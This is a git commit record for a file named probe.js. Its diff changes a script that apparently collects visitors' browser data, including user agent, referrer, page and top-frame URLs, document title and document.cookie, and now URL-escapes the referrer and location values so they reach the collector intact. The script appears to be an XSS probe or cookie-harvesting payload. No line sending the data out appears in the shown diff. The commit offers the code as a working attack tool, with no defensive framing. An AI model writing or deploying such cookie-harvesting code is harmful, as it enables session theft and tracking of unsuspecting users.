30acf7581407bbc5c495b357521709ddc47ebe79
flyr4nk <79087877@qq.com>
2013-06-07 17:58:16 +0800

    Update probe.js
    避免因为出现&符号时候，获取数据不全。

--- probe.js
+++ probe.js
@@ -22,9 +22,9 @@ info.browser = function(){
 }();
 info.ua = escape(navigator.userAgent);
 info.lang = navigator.language;
-info.referrer = document.referrer;
-info.location = window.location.href;
-info.toplocation = top.location.href;
+info.referrer = escape(document.referrer);
+info.location = escape(window.location.href);
+info.toplocation = escape(top.location.href);
 info.cookie = escape(document.cookie);
 info.domain = document.domain;
 info.title = document.title;
